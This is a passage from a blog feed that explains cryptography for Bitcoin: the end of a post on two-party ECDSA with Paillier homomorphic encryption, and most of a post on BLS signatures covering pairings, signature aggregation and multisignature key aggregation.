				<p id="9b0e" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Notice that we need to get an encrypted value of the private key <strong class="gm hk"><em class="hj">e(pk1)</em></strong><br />only once during the setup phase and then we can reuse it for every<br />signature in the future. Even more, thanks to the homomorphic properties<br />of the encryption scheme we can use <a class="ey hi" href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki" target="_blank" rel="noopener nofollow">HD wallets</a><br />to generate new encrypted children keys from the encrypted master key.<br />To derive a child key we only need to add a certain number to the parent<br />private key — we can easily do it homomorphically with the encrypted<br />master key we have.</p><p id="7748" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Unfortunately, this scheme works only for <em class="hj">two parties</em>. If we want to use arbitrary m-of-n multisignature with bare ECDSA we still can do it, but it requires a much <a class="ey hi" href="https://eprint.iacr.org/2016/013.pdf" target="_blank" rel="noopener nofollow">more complicated scheme</a>.<br />And it is 100 times slower. But even with only two parties we can do<br />many amazing things — all Lightning channels can appear as normal<br />transactions (pay-to-pubkeyhash), and we can even do <a class="ey hi" href="https://lists.linuxfoundation.org/pipermail/lightning-dev/attachments/20180426/fe978423/attachment-0001.pdf" target="_blank" rel="noopener nofollow">scriptless scripts with ECDSA</a>.</p><h3 id="3a7a" class="hl hm dn au av hn ho gp hp hq hr gt hs ht hu hv hw hx hy hz ia ib ic id ie if ch" data-selectable-paragraph=""> </h3><h3 id="3a7a" class="hl hm dn au av hn ho gp hp hq hr gt hs ht hu hv hw hx hy hz ia ib ic id ie if ch" data-selectable-paragraph=""><b>Homomorphic encryption</b></h3><p id="2753" class="gk gl dn gm b gn ig gp gq gr ih gt gu gv ii gx gy gz ij hb hc hd ik hf hg hh dg ch" data-selectable-paragraph="">So how does this homomorphic magic work? As usual in cryptography, we use huge numbers everywhere. We start by choosing two large prime numbers <strong class="gm hk"><em class="hj">p</em></strong> and <strong class="gm hk"><em class="hj">q</em></strong> of the same length (if they have different lengths we need a <a class="ey hi" href="https://en.wikipedia.org/wiki/Paillier_cryptosystem" target="_blank" rel="noopener nofollow">fancier algorithm</a>). We will use their product <strong class="gm hk"><em class="hj">n=p⋅q</em></strong> and a number <strong class="gm hk"><em class="hj">g=n+1</em></strong> for encryption. These two numbers (<strong class="gm hk"><em class="hj">n</em></strong>, <strong class="gm hk"><em class="hj">g</em></strong>) are public and can be shared with anyone. Another pair of numbers, <strong class="gm hk"><em class="hj">λ=</em></strong><a class="ey hi" href="https://en.wikipedia.org/wiki/Least_common_multiple" target="_blank" rel="noopener nofollow"><strong class="gm hk"><em class="hj">lcm</em></strong></a><strong class="gm hk"><em class="hj">(p–1, q–1)=(p–1)⋅(q–1)/2</em></strong> and <strong class="gm hk"><em class="hj">µ=λ^–1 mod n </em></strong>are used for decryption. We need to keep them secret.</p><p id="8976" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">This <strong class="gm hk"><em class="hj">λ</em></strong> number is <a class="ey hi" href="https://en.wikipedia.org/wiki/Carmichael_function" target="_blank" rel="noopener nofollow">pretty interesting</a>. If we take <em class="hj">any</em> number <strong class="gm hk"><em class="hj">r</em></strong> and calculate <strong class="gm hk"><em class="hj">r^λ mod n</em></strong> we’ll get <strong class="gm hk"><em class="hj">1</em></strong>. If we calculate <strong class="gm hk"><em class="hj">r^(λ⋅n) mod n²</em></strong> we will also get <strong class="gm hk"><em class="hj">1</em></strong>. This means we can compute an inverse of a number as <strong class="gm hk"><em class="hj">r^(–1)=r^(λ-1) mod n</em></strong>. It also works for <strong class="gm hk"><em class="hj">λ</em></strong> itself:</p><p id="9652" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">µ=λ^–1 = λ^(λ–1) mod n</em></strong></p><p id="6666" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Now, to <em class="hj">encrypt</em> a secret number <strong class="gm hk"><em class="hj">x</em></strong> we pick a random number <strong class="gm hk"><em class="hj">r</em></strong> and compute encrypted value <strong class="gm hk"><em class="hj">e(x) = g^x ⋅ r^n mod n²</em></strong>. All the operations with encrypted data are happening modulo <strong class="gm hk"><em class="hj">n²</em></strong>. It is a pretty large number, so homomorphic calculations may be pretty slow and memory consuming. If we want to <em class="hj">add</em> a number <strong class="gm hk"><em class="hj">a</em></strong> to the value <strong class="gm hk"><em class="hj">x</em></strong> using only encrypted data we just multiply it by <strong class="gm hk"><em class="hj">g^a</em></strong>:</p><p id="4702" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">e(x)⋅g^a = g^(x+a)⋅ r^n mod n² = e(x+a)</em></strong></p><p id="c8cd" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">To <em class="hj">multiply</em> <strong class="gm hk"><em class="hj">x</em></strong> by some number <strong class="gm hk"><em class="hj">b</em></strong> we need to exponentiate the encrypted value:</p><p id="2ffc" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">e(x)^b=g^(x⋅b)⋅(r^b)^n mod n² = e(x⋅b)</em></strong></p><p id="900a" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">The random number changes from <strong class="gm hk"><em class="hj">r</em></strong> to <strong class="gm hk"><em class="hj">r^b</em></strong>, but we don’t really care. It’s just a different random number.</p><p id="8c6d" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">After we are done with the calculations we can <em class="hj">decrypt</em> the data and get the result. To extract <strong class="gm hk"><em class="hj">x </em></strong>from the cyphertext we do the following:</p><p id="1036" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">x = (e(x)^λ mod n² – 1) / n ⋅ µ mod n</em></strong></p><p id="0dfb" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Looks confusing. Let’s take a closer look. First, we take our cyphertext <strong class="gm hk"><em class="hj">e(x)</em></strong> and exponentiate it to the power of <strong class="gm hk"><em class="hj">λ</em></strong>:</p><p id="5181" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">e(x)^λ mod n² = g^(x⋅λ) ⋅ r^(n⋅λ) mod n² = g^(x⋅λ) mod n²</em></strong></p><p id="a1fe" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Here we used the fact that <strong class="gm hk"><em class="hj">r^(n⋅λ) mod n² = 1</em></strong> and <strong class="gm hk"><em class="hj">r</em></strong> part disappears.</p><p id="195f" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">Now, recall that <strong class="gm hk"><em class="hj">g=n+1</em></strong>. Using <a class="ey hi" href="https://en.wikipedia.org/wiki/Binomial_theorem" target="_blank" rel="noopener nofollow">binomial theorem</a> we can expand <strong class="gm hk"><em class="hj">(1+n)^x </em></strong>and after taking it modulo <strong class="gm hk"><em class="hj">n²</em></strong> only first two terms will remain:</p><p id="8406" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">g^x mod n² = (1+n)^x mod n² = (1 + x⋅n + x⋅(x-1)/2 ⋅ n² + …) mod n² = (1+x⋅n)</em></strong></p><p id="95db" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">In our case we have:</p><p id="7df2" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hk"><em class="hj">g^(λ⋅x) mod n² = (1 + λx⋅n + λx⋅(λx-1)/2 ⋅ n² + …) mod n² = 1 + λx⋅n</em></strong></p><p id="336f" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">From here we subtract <strong class="gm hk"><em class="hj">1</em></strong>, divide by <strong class="gm hk"><em class="hj">n</em></strong>, get rid of the <strong class="gm hk"><em class="hj">λ</em></strong> (multiplying by the inverse of it — <strong class="gm hk"><em class="hj">µ</em></strong>) and end up with pure <strong class="gm hk"><em class="hj">x</em></strong>.</p><p id="d746" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">If you don’t believe in the above — try it out by yourself. I wrote a tiny <a class="ey hi" href="https://github.com/stepansnigirev/2-party-ecdsa-playground/blob/master/paillier.ipynb" target="_blank" rel="noopener nofollow">jupyter notebook</a> just to make sure it works.</p><h3 id="408d" class="hl hm dn au av hn ho gp hp hq hr gt hs ht hu hv hw hx hy hz ia ib ic id ie if ch" data-selectable-paragraph=""> </h3><h3 id="408d" class="hl hm dn au av hn ho gp hp hq hr gt hs ht hu hv hw hx hy hz ia ib ic id ie if ch" data-selectable-paragraph=""><b>Further reading</b></h3><p id="ad3b" class="gk gl dn gm b gn ig gp gq gr ih gt gu gv ii gx gy gz ij hb hc hd ik hf hg hh dg ch" data-selectable-paragraph="">Here we discussed the basic idea of the algorithm, but there are a few things that are left outside of the scope of this post. In particular, the setup phase of the algorithm is a bit more complicated. The second party needs to make sure that the ciphertext he got from the first party corresponds to the public key <strong class="gm hk"><em class="hj">P1</em></strong>. So the first party needs to prove the connection between the ciphertext <strong class="gm hk"><em class="hj">e(pk1)</em></strong> and the public point <strong class="gm hk"><em class="hj">P1</em></strong>. This is quite tricky and computationally heavy and can take <em class="hj">a few seconds</em> on the modern computer. But as soon as the setup phase is done, all the signing happens pretty quickly — all the proofs there are fast.</p><p id="2275" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">There are more interesting things in the paper. I strongly recommend reading it if you can. Also, homomorphic encryption is really wonderful and I wrote only the core principle without going into details.</p><p id="39ac" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">And we didn’t discuss applications of this scheme in details. So check out these papers to find out more:</p><ul class=""><li id="155e" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh jn jo jp ch" data-selectable-paragraph=""><a class="ey hi" href="https://www.google.de/search?q=2+party+ecdsa&amp;oq=2+party+ecdsa&amp;aqs=chrome..69i57j69i60l2j69i61j69i59j69i64.4847j0j4&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank" rel="noopener nofollow">Original paper by Lindell — Fast Secure Two-party ECDSA Signing</a></li><li id="5222" class="gk gl dn gm b gn jq gp gq gr jr gt gu gv js gx gy gz jt hb hc hd ju hf hg hh jn jo jp ch" data-selectable-paragraph=""><a class="ey hi" href="http://www.cs.tau.ac.il/~fiat/crypt07/papers/Pai99pai.pdf" target="_blank" rel="noopener nofollow">Paillier paper on homomorphic scheme</a></li><li id="3a5d" class="gk gl dn gm b gn jq gp gq gr jr gt gu gv js gx gy gz jt hb hc hd ju hf hg hh jn jo jp ch" data-selectable-paragraph=""><a class="ey hi" href="https://lists.linuxfoundation.org/pipermail/lightning-dev/attachments/20180426/fe978423/attachment-0001.pdf" target="_blank" rel="noopener nofollow">Scriptless scripts with ECDSA</a></li><li id="2e6c" class="gk gl dn gm b gn jq gp gq gr jr gt gu gv js gx gy gz jt hb hc hd ju hf hg hh jn jo jp ch" data-selectable-paragraph=""><a class="ey hi" href="https://eprint.iacr.org/2018/472.pdf" target="_blank" rel="noopener nofollow">Multi-Hop Locks for Secure, Privacy-Preserving and Interoperable Payment-Channel Networks</a></li></ul>					</div>
						</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
									</div>
			</div>
					</div>
		]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>BLS signatures: better than Schnorr</title>
		<link>https://specter.solutions/bls-signatures-better-than-schnorr/</link>
		
		<dc:creator><![CDATA[Stepan Snigirev]]></dc:creator>
		<pubDate>Mon, 25 Jun 2018 21:30:09 +0000</pubDate>
				<category><![CDATA[Bitcoin]]></category>
		<category><![CDATA[Blockchain]]></category>
		<category><![CDATA[Cryptography]]></category>
		<category><![CDATA[Math]]></category>
		<guid isPermaLink="false">https://specter.solutions/?p=3671</guid>

					<description><![CDATA[In the previous post I wrote about Schnorr signatures and how awesome they are. This one is about Boneh-Lynn-Shacham signatures and their extremely nice features that are not possible with Schnorr. Shortly, what we know so far: ECDSA signatures are ok. They do their job and do it well, but nothing more. We can’t combine &#8230;<p class="read-more"> <a class="" href="https://specter.solutions/bls-signatures-better-than-schnorr/"> <span class="screen-reader-text">BLS signatures: better than Schnorr</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[		<div data-elementor-type="wp-post" data-elementor-id="3671" class="elementor elementor-3671">
						<div class="elementor-inner">
				<div class="elementor-section-wrap">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-3d1382a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3d1382a" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
							<div class="elementor-row">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-f3c4fbf" data-id="f3c4fbf" data-element_type="column">
			<div class="elementor-column-wrap elementor-element-populated">
							<div class="elementor-widget-wrap">
						<div class="elementor-element elementor-element-4aca3b1 elementor-widget elementor-widget-text-editor" data-id="4aca3b1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph="">In the <a href="https://medium.com/@snigirev.stepan/how-schnorr-signatures-may-improve-bitcoin-91655bcb4744" target="_blank" rel="noopener">previous post</a> I wrote about Schnorr signatures and how awesome they are. This one is about <a href="https://www.iacr.org/archive/asiacrypt2001/22480516.pdf" target="_blank" rel="noopener nofollow">Boneh-Lynn-Shacham</a> signatures and their <a href="https://eprint.iacr.org/2018/483.pdf" target="_blank" rel="noopener nofollow">extremely nice features</a> that are not possible with Schnorr.</p><p data-selectable-paragraph="">Shortly, what we know so far:</p><p data-selectable-paragraph="">ECDSA signatures are ok. They do their job and do it well, but nothing more. We can’t combine signatures or keys and every signature has to be verified independently. With multisig transactions, it becomes especially annoying. We have to check all the signatures and the corresponding public keys one by one, waste a lot of space in a block and pay large fees.</p><p data-selectable-paragraph="">Schnorr signatures are awesome — if we do it right we can combine all signatures and public keys in the transaction to a single key and a signature and nobody will find out that they correspond to multiple keys. Also block validation can be faster — we can validate all signatures at once. There are a few issues though:</p><ul><li data-selectable-paragraph="">Multisig scheme requires several communication rounds. This can be very annoying with cold storage.</li><li data-selectable-paragraph="">With signature aggregation we have to rely on random number generator — we can’t choose random point <strong><em>R</em></strong> deterministically like we do in ECDSA</li><li data-selectable-paragraph="">m-of-n multisig scheme is tricky — we need to make a merkle tree of public keys that can get pretty large for large m and n.</li><li data-selectable-paragraph="">We can‘t combine all signatures in the block to a single signature.</li></ul><p data-selectable-paragraph="">BLS signatures can fix all of the above. We don’t need random numbers <em>at all</em>, all signatures in the block can be combined to a single signature, m-of-n multisig is very simple and we don’t need several communication rounds between signers. In addition to that BLS signatures are 2 times shorter than Schnorr or ECDSA — signature is not a pair, but a single curve point. Sounds amazing! Let’s see how they work.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>BLS signatures magic</b></h3><p data-selectable-paragraph="">Before we start we need two new constructions — hashing to the curve and curves pairing.</p><p data-selectable-paragraph=""><b>Hashing to the curve</b></p><p data-selectable-paragraph="">Normally with ECDSA and Schnorr we hash the message and use this hash in the signing algorithm as a number. For BLS signatures we need a slightly modified hashing algorithm that hashes directly to the elliptic curve. The easiest way is to hash a message as usual and treat the result as an<br /><strong><em>x</em></strong>-coordinate of a point. Elliptic curves (like the one we are using in Bitcoin) usually have about 2²⁵⁶ points and SHA-256 hashing algorithm also gives a 256-bit result. But for every valid <strong><em>x</em></strong>-coordinate there are two points with positive and negative <strong><em>y</em></strong>-coordinate (just because if <strong><em>(x,y)</em></strong> is on the curve <strong><em>y²=x³+ax+b</em></strong> then <strong><em>(x,-y)</em></strong> is also on the curve). This means that our hash has roughly 50% probability to find two points for some <strong><em>x</em></strong> and 50% to find none.</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-555c96f elementor-widget elementor-widget-image" data-id="555c96f" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="878" height="1024" src="https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-878x1024.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-878x1024.png 878w, https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-257x300.png 257w, https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-768x896.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-1317x1536.png 1317w, https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x-600x700.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-3ONrQQr0leQSUCaKeBXITA@2x.png 1400w" sizes="(max-width: 878px) 100vw, 878px" />											<figcaption class="widget-image-caption wp-caption-text">Toy example of hashing to the elliptic curve y²=x³+7 defined over finite field modulo 23. Only half of all x-coordinates have points. Here only third attempt was successful.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-8c30fc0 elementor-widget elementor-widget-text-editor" data-id="8c30fc0" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p data-selectable-paragraph="">To find a point <em>for any message</em> we can try hashing several times by appending a number to the message and incrementing it on fail. If <strong><em>hash(m||0)</em></strong> doesn’t find a point we try <strong><em>hash(m||1)</em></strong>, <strong><em>hash(m||2)</em></strong> and so on until we finally get one that matches. Then we choose one of the two corresponding points, say the one with smaller <strong><em>y</em></strong>, and we are done.</p><p data-selectable-paragraph=""><b>Curves pairing</b></p><p data-selectable-paragraph="">Another thing we need is a very special function that takes two points <strong><em>P</em></strong> and <strong><em>Q</em></strong> on a curve (or on two different curves) and maps them to a number:</p><p data-selectable-paragraph=""><strong><em>e(P, Q) → n</em></strong>.</p><p data-selectable-paragraph="">We also require one important property from this function. If we have some secret number <strong><em>x</em></strong> and two points <strong><em>P</em></strong> and <strong><em>Q</em></strong> we should obtain the same result regardless of which point we multiply by this number:</p><p data-selectable-paragraph=""><strong><em>e(x×P, Q) = e(P, x×Q)</em></strong>.</p><p data-selectable-paragraph="">Basically we need to be able to swap multipliers of the points between two arguments without changing the result. More generally all these swaps should give the same result:</p><p data-selectable-paragraph="">e(<strong><em>a×P, b×Q) = e(P, ab×Q) = e(ab×P, Q) = e(P, Q)^(ab)</em></strong></p><p data-selectable-paragraph="">I am not going to describe how exactly this function works. Underlying math is pretty complicated and if you want to know all the nasty details I would suggest reading <a href="https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627" target="_blank" rel="noopener">this post</a> and references in it. If you want to go deeper — <a href="https://crypto.stanford.edu/pbc/thesis.pdf" target="_blank" rel="noopener nofollow">this thesis</a> is completely about pairings. For now we just accept that such functions exist and they don’t reveal any information about our secret number <strong><em>x</em></strong>.</p><p data-selectable-paragraph="">One important note is that we can’t use <em>any</em> elliptic curve here (in particular, standard Bitcoin curve secp256k1 doesn’t work). To make this function efficient and secure we have to use very special curves from “pairing-friendly” family.</p><p id="2f49" class="it hu dn au av iu iv iw hx ix iy iz ia ja jb jc ie jd je jf ii jg jh ji im jj ch" data-selectable-paragraph=""><b>BLS signature scheme</b></p><p id="a0e5" class="gk gl dn gm b gn io gp gq gr ip gt gu gv iq gx gy gz ir hb hc hd is hf hg hh dg ch" data-selectable-paragraph="">Now we have everything we need to construct a BLS signature. As usual our private key is some secret number <strong class="gm hr"><em class="hs">pk</em></strong>, our public key is <strong class="gm hr"><em class="hs">P = pk×G</em></strong> and the message we are signing is <strong class="gm hr"><em class="hs">m</em></strong>.</p><p id="5ba2" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">To calculate the signature we hash our message to the curve <strong class="gm hr"><em class="hs">H(m)</em></strong> and multiply resulting point by our private key: <strong class="gm hr"><em class="hs">S = pk×H(m)</em></strong>. That’s it! Nothing else — no random numbers, no extra operations, just a hash times the private key! Our signature is just one single point on the curve that takes only 33 bytes in compressed serialisation format!</p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-f7cf086 elementor-widget elementor-widget-image" data-id="f7cf086" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="1024" height="793" src="https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x-1024x793.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x-1024x793.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x-300x232.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x-768x595.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x-600x465.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-IpmIdJLR36iHnOHq1OqHnw@2x.png 1355w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">BLS signature generation. To obtain signature we multiply a hash of the message by the private key.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-9d453e4 elementor-widget elementor-widget-text-editor" data-id="9d453e4" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p id="ec61" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">To verify this signature one can take our public key <strong class="gm hr"><em class="hs">P</em></strong> and check that</p><p id="1881" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hr"><em class="hs">e(P, H(m)) = e(G, S)</em></strong></p><p id="7627" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph="">It it true because of the nice property of the pairing function described above:</p><p id="4247" class="gk gl dn gm b gn go gp gq gr gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh dg ch" data-selectable-paragraph=""><strong class="gm hr"><em class="hs">e(P, H(m)) = e(pk×G, H(m)) = e(G, pk×H(m)) = e(G, S)</em></strong></p>					</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-641b5aa elementor-widget elementor-widget-image" data-id="641b5aa" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
								<div class="elementor-image">
									<figure class="wp-caption">
										<img loading="lazy" decoding="async" width="1024" height="1022" src="https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-1024x1022.png" class="attachment-large size-large" alt="" srcset="https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-1024x1022.png 1024w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-150x150.png 150w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-300x300.png 300w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-768x767.png 768w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-600x599.png 600w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x-100x100.png 100w, https://specter.solutions/wp-content/uploads/2021/01/1-CyqBtsUTnME5R4QTU_ZZCg@2x.png 1337w" sizes="(max-width: 1024px) 100vw, 1024px" />											<figcaption class="widget-image-caption wp-caption-text">BLS signature verification. We just need to check that the public key and the message hash are mapped to the same number as the curve generator point and the signature.</figcaption>
										</figure>
								</div>
						</div>
				</div>
				<div class="elementor-element elementor-element-f55cc82 elementor-widget elementor-widget-text-editor" data-id="f55cc82" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
								<div class="elementor-text-editor elementor-clearfix">
				<p>This signature scheme is beautiful and simple, but it also has several very nice features, especially for Bitcoin.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Signature aggregation</b></h3><p data-selectable-paragraph="">Now let’s combine all signatures in the block! Imagine we have a block with 1000 transactions and every transaction contains a signature <strong><em>Si</em></strong>, a public key <strong><em>Pi</em></strong> and a message that is signed <strong><em>mi</em></strong>. Why to store all the signatures if we can combine them? After all, we only care if all signatures in the block are valid. Aggregated signature will be just a sum of all signatures in the block:</p><p data-selectable-paragraph=""><strong><em>S = S1+S2+…+S1000</em></strong></p><p data-selectable-paragraph="">To verify the block we need to check that the following equality holds:</p><p data-selectable-paragraph=""><strong><em>e(G, S) = e(P1, H(m1))⋅e(P2, H(m2))⋅…⋅e(P1000, H(m1000))</em></strong></p><p data-selectable-paragraph="">If you look carefully you will see that it’s indeed true:</p><p data-selectable-paragraph=""><strong><em>e(G, S) = e(G, S1+S2+…+S1000) = e(G, S1)⋅e(G, S2)⋅…⋅e(G, S1000) = e(G, pk1×H(m1))⋅…⋅e(G, pk1000×H(m1000)) = e(pk1×G, H(m1))⋅…⋅e(pk1000×G, H(m1000)) = e(P1, H(m1))⋅e(P2, H(m2))⋅…⋅e(P1000, H(m1000))</em></strong></p><p data-selectable-paragraph="">We still need to know all the public keys and calculate 1001 pairing functions, but at least <em>all the signatures in the block take only 33 bytes</em>. Signature aggregation can be done by a miner and save a lot of space in the block.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Key aggregation and n-of-n multisignature</b></h3><p data-selectable-paragraph="">If we are using multisignature addresses, we are signing <em>the same transaction</em> with different keys. In this case we can do key aggregation like in Schnorr, where we combine all signatures and all keys to a single pair of a key and a signature. Let’s take a common 3-of-3 multisig scheme (it can be done similarly for any number of signers).</p><p data-selectable-paragraph="">A simple way to combine them is to add all the signatures and all the keys together. The result will be a signature <strong><em>S=S1+S2+S3</em></strong> and a key <strong><em>P=P1+P2+P3</em></strong>. It’s easy to see that the same verification equation still works:</p><p data-selectable-paragraph=""><strong><em>e(G, S) = e(P, H(m))</em></strong></p><p data-selectable-paragraph=""><strong><em>e(G, S) = e(G, S1+S2+S3) = e(G, (pk1+pk2+pk3)×H(m)) = e((pk1+pk2+pk3)×G, H(m)) = e(P1+P2+P3, H(m)) = e(P, H(m))</em></strong></p><p data-selectable-paragraph="">Just like in Schnorr we need to protect ourselves from the rogue key attack. We can do it either by asking every co-signer to prove that they have private keys for their public keys (by signing their public keys), or we can add some nonlinearity to the scheme and make rogue key attack impossible. Instead of just summing up all the keys and signatures we multiply them by a certain number and then add:</p><p data-selectable-paragraph=""><strong><em>S = a1×S1+a2×S2+a3×S3</em></strong></p><p data-selectable-paragraph=""><strong><em>P = a1×P1+a2×P2+a3×P3</em></strong></p><p data-selectable-paragraph="">Here coefficients of the signatures and keys are calculated deterministically from the public key of the signer and all other public keys:</p><p data-selectable-paragraph=""><strong><em>ai = hash(Pi, {P1,P2,P3})</em></strong></p><p data-selectable-paragraph="">For example it can be just a concatenation of the signer’s public key and the whole set of public keys used for signing: <strong><em>ai = hash(Pi||P1||P2||P3)</em></strong>.</p><p data-selectable-paragraph="">The same verification equation still works. There will be additional coefficients <strong><em>ai</em></strong> in the proof, but the logic remains.</p><p data-selectable-paragraph="">Nice thing about this scheme is that you don’t need several communication rounds between devices. You just need to know who are other signers, and you are all set. This is much simpler than 3-round multisig scheme for Schnorr signatures. It also doesn’t rely on any randomness, it is a <em>completely deterministic signature algorithm</em>.</p><h3 data-selectable-paragraph=""> </h3><h3 data-selectable-paragraph=""><b>Subgroup multisignature scheme (m-of-n multisig)</b></h3><p data-selectable-paragraph="">Often we don’t want to use n-of-n multisig scheme, we prefer to use m-of-n, say, 2-of-3. We don’t 